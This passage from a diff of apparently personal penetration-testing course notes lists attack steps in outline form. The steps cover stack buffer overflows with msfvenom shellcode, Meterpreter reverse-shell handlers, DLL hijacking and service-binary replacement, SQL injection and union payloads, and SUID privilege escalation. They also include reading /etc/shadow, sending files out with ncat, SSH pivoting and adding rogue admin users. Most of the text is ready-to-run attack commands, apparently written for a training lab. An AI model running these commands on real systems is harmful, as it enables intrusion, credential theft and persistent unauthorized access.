+       - go to the middle of the output and grab a handul of the address 
+       - copy the address to python script in a multiline comment
+       - comment out old eip
+       - create new eip with one of the copied addresses
+       - reverse the byte order of the address to change it to little endian
+       - put in a nop sled to give the shellcode a landing pad
+       - create an msfvenom payload "msfvenom -p linux/x86/exec CMD="/bin/whoami" -b "\x00" -f python"
+       - the output will be the shellcode, copy from the output(buf to buf) and copy to the python script
+       - ensure the print statement is good to go
+       - start testing
+       - if doesn't work change the nop and try again
+       - change the payload and try again
+       - change the eip
+ - Windows
+    - Using a windows machine execute payload
+       - use netstat -anop tcp to see what port(s) it opened 
+    - Create a socket from a linux box to connect with the server
+    - Modify the socket code to interact with the server
+    - depending on the output fuzzing may be necessary to determine where it crashes
+    - Using the fuzz_results.csv file you can view what command crashed the program
+    - Input the .exe to Immunity to verify it crashes
+    - Using ruby pattern_create.rb -l or wiremask.eu build a buffer to find the offset
+    - Use the eip to determine the offset
+    - Verify you have full control by sending the offset amount of 'A's and then 4 'B's
+    - Once that has been verified we need to find all the 'bad' characters 
+       - We can do this by using "!mona bytearray" on the immunity program
+    - We need to find a jmp address now
+       - using immunity enter "!mona jmp -r ESP -m "*.dll"(corresponding dll)
+       - make sure when you input the eip it is little endian
+    - Build a payload
+       - depending on the OS
+          - msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.138 lport=1234 -b "\x00" -f python
+    - metasploit
+       - use multi/handler
+       - set payload windows/meterpreter/reverse_tcp
+       - set lhost
+       - set lport
+       - exploit
+    - can also use msfvenom -p windows/shell/reverse_tcp
+    - can also use msfvenom -p windows/shell_reverse_tcp
+
+Post Exploitation-----------------------------------------------------------------------------------
+    - Command demo Linux 
+       - cat /etc/passwd
+          - username:hashed password:userid:group userid:comments:homedir:default shell
+       - cat /etc/shadow
+          - contains encrypted user password
+       - last
+          - displays information about the last user to logon
+       - who
+          - displays who is currently logged on
+       - whoami
+          - shows who you are currently logged in as
+       - groups
+          - displays what groups the user is part of
+       - id
+          - pulls up uid,guid,and groups for the user who ran the command
+       - ps -elf
+          - displays current running processes in long format
+          - -aux
+             - gives us the process tree
+       - pstree
+          - gives the process listing in a tree format
+       - sudo lsof
+          - list of open files on the system
+       - chkconfig
+          - SysV
+       - systemctl list-units --type=service
+          - SystemD service listings
+          - adding a "| grep running" will list only running services
+       - ifconfig -a
+          - same as ip a but a little bit easier to read
+       - netstat
+          - list connections to a machine
+       - arp -an
+          - allows us to view the arp cache
+       - ip route
+          - gives us our routing table
+          - route
+             - does the same thing
+          - netstat -r
+             - does the same thing
+       - cat /proc/cpuinfo
+          - gives us information about the cpu
+       - lsmod
+          - lists kernel modules
+       - cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+          - shifts the characters in the file and saves it to a different file
+       - cat file | base64
+          - converts the file to base64 encryption
+       - scp <source> <destination>
+       - ncat --ssl <ip> <port> < <file>
+    - Command demo Windows
+       - net user
+          - Shows users on the box
+       - get-localuser
+          - Shows users on the box PS
+       - get-localgroup
+          - Shows all the groups on the box PS
+       - get-localuser | get-member
+          - shows what we can do with the output with select PS
+       - tasklist /v
+          - shows running processes
+       - get-process
+          - shows running processes PS
+       - get-process | where {$_.sessionid -eq 1}
+       - tasklist /svc
+          - shows services
+       - get-service | where {$_.status -eq "running"}
+          - shows services that are running PS
+       - net start
+          - shows startup services
+       - wmic service list status
+          - running services CMD
+       - ipconfig /all
+          - view info about the NICs
+       - netstat -anob
+          - all listening ports
+       - wmic net use list
+          - CMD
+       - net view
+          - CMD
+       - arp -a
+          - displays the ARP cache
+       - route print
+          - prints the routing table
+       - systeminfo
+          - gives a lot of info about the box
+       - date
+          - allows us to enumerate where the pc is
+       - obfuscation
+          - type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c', 'd'} > translated.out
+          - certutil -encode <file> encoded.b64
+
+Windows Exploitation-----------------------------------------------------------------------------------
+   - Demo: DLL Hijacking
+      - Identify Vulnerability
+      - Validate permissions
+      - Validate executable paths
+      - Replace with malicous file
+   - schtasks /query /fo LIST /v
+   - schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6
+   - C:\Users\student\exercise_2\putty.exe
+   - Run: sigcheck c:\users\student\exercise_2\putty.exe
+   - Run: icacls "c:\users\student\exercise_2"
+   - msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f dll > WIMM.dll
+   - Transfer the DLL to the target machine using one of the following methods:
+      - scp the dll from linux to target machine
+   - Put the retrieved DLL in the same location as the vulnerable Putty executable
+      - Run: copy "PATH OF MALICIOUS DLL" "c:\users\student\exercise_2\ntmarta.dll"
+   - Allow for Putty to execute with scheduled task
+- Vulnerable services
+   - Find vulnerable services
+      - wmic service list full
+      - services.msc
+      - sc.exe qc <service name>
+      - for /f "tokens=2 delims='='" %a in ('wmic service get PathName /FORMAT:LIST^|findstr /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+   - Check permissions
+      - icacls "C:\Program Files\7-Zip\"
+      - icacls "C:\Program Files\7-Zip\7z.exe"
+   - Identify and document the service information associated with the path
+      - From CMD: wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" | finstr /i "7z.exe"
+         - path: C:\Program Files\7-Zip\
+         - service name: testservice2
+   - Exploiting the service
+      - msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f exe > 7z.exe
+      - create a backup of the 7z.exe file on the target system
+      - replace the original 7z.exe with the malicous 7z.exe
+         - if using a reverse shell payload setup a netcat listener
+         - start the service
+         - verify it's running
+         - tasklist /FI "IMAGENAME eq 7z.exe"
+         
+ - Persistance locations
+    - Sch tasks
+    - Run keys (HKLM/HKU)
+    - psprofiles
+    
+Review
+MAKE OPNOTES THROUGH THE WHOLE THING
+
+first step scan the given ip
+do a banner grab on the open ports
+   nc <ip> <port>
+run http-enum.nse script against the http port
+   make note of the command and the results
+run a nikto scan against the same thing
+   nikto -host <ip> if going through tunnel nikto -host 0.0.0.0 -port <built tunnel port>
+
+SQL Injection WEB EXPLOITATION PORT 80 SHIT
+      connect to website on firefox <ip>:<port>
+      if you find an input field make note of the address
+         in opnotes make note of anything that works or doesnt work(command injection,directory traversal)
+         grab anything you can and move on
+         if a question asks what a users shell is look at /etc/passwd
+         CHECK /etc/hosts !!!!!!!!!!!!!!!
+      make note of findings in those files
+      if you find a command injection field or a webshell you can add your ssh key
+      if you find a username and password field it will be SQL injection
+         ' or 1='1 / ' or '1'='1 / try different variations
+         if it works:
+            reload the page with the dev console in the network tab click on the post and go to the cookies/header
+            click the raw button on the get copy the line and then click in the search bar and enter something like:
+            http://0.0.0.0:20001/login.php?username=%27+or+1%3D%271&passwd=%27+or+1%3D%271
+      SQL injection review with Sgt Wilson :)
+         if selection is a number try without quotes if not number it probably needs quotes
+         SQL Steps to success
+             1. selection=1 or 1=1#; iterate through all options using this to find the vulnerable one
+             1.1. document what you found (the web address of the vulnerable one)
+             2. identify which columns are which and identify how many (selection=7 union select 1,2,3)
+                if it doesn't work right off the bat with the inital number of columns keep adding numbers until it works
+             2.1. document the order of the columns and the amount
+             3. TEST THE GOLDEN STATEMENT(selection=7 union select table_schema(1),table_name(2),column_name(3) from information_schema.columns)
+             3.1. Document
+             4. Look at the question and figure out what it wants you to find
+                selection=7 union select username,user_id,name from siteusers.users
+             5. If creds are farmed attempt to login
+                If you come across passwords and they don't work try decoding with base64 or rot13
+             5.1. If none of them work make note and move on          
+            
+DOCUMENT!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+If you come across passwords and they don't work try decoding with base64 or rot13
+
+INITIAL ACCESS
+    when getting onto the box
+       whoami
+       hostname
+       ip a
+       ifconfig -a
+       VERIFY YOU ARE IN A BASH SHELL
+    cat /etc/hosts (if not already done)
+    sudo -l
+ Priv Esc
+    look for way to escalate
+       find / -type f -perm /4000 -ls 2>/dev/null
+          send results through gtfobins!!!!!!!!!!!!!!!!!!!!!!!!!!
+             if you find something with gtfobins:
+                use the "exploit" to escalate to root
+                verify you are root with whoami
+       if you can't escalate make note of it
+ Checking for buffer overflow file
+    looking for nonstandard files IT WILL BE WEIRD
+    if gdb exists on the box you will be doing a buffer overflow
+       when you find a buffer overflow keep it simple stupid
+          msfvenom -p linux/x86/exec CMD="cat /etc/shadow" ... to cat the file you need
+    Check for more hops
+       conduct a ping sweep on the network(s) it's connected to
+          based on ttl you can make a guess on the kind of box it is
+       check ip neigh as a last resort
+       arp -an is very unreliable
+    if the ping sweep gives results create a dynamic tunnel to conduct nmap scans
+    ssh <name>@tgtip -D 9050
+    conduct nmap scans of the discovered ips
+       make note of the scan that was conducted
+    connect to the ips based on the available ports
+       if the open ports include 80 see above steps
+Windows Specific Notes (if 445/3389 is open)
+       IF ANY OF THE PORTS SAY WELCOME TO SECURE SERVER 
+         using msfconsole
+            use multi/handler
+            set payload windows/meterpreter/reverse_tcp
+            set lhost 0.0.0.0
+            set lport 1234
+            run
+            send payload
+            verify it works by looking for "Welcome to secure server"
+            create a user and add them to the admin group and the remote desktop groups
+            re-rdp to it as the new user
+      
+   once you gain access
+   look at the following:
+      services.msc
+         find the weird one and look at the properties
+         make note of the path
